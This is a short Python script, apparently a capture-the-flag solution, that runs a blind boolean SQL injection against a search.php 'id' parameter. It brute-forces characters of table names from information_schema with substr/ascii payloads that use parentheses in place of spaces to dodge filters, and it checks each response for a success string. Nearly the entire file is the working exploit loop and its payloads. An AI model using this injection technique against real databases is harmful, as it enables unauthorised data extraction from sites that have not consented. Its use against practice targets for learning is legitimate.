from typing import Counter
import requests
# url = 'http://ada140dc-96b5-4d36-abdd-d29dff79bce2.challenge.ctf.show/index.php?id=1/**/or/**/'
url = 'http://97abc8ce-838e-46cf-bee1-25cd576ef7c8.node4.buuoj.cn:81/search.php?id='
name = ''

#http://97abc8ce-838e-46cf-bee1-25cd576ef7c8.node4.buuoj.cn:81/search.php?id=1(ascii(substr((group_concat(table_name) from information_schema.tables where table_schema=database()) from 1 for 1))=%d#

for i in range(1,46):
    for j in range(31,128):
        payload = '(ascii(substr((group_concat(table_name)(from)information_schema.tables(where)table_schema=database())(from)%d(for)1))=%d'
        payload1 = payload%(i,j)
        print(payload1)
        result = requests.get( url + payload1)
        if "NO! Not this! Click others~~~" in result.text:
            print("\n")
            name += chr(j)
            print(name,"\n")
            break
        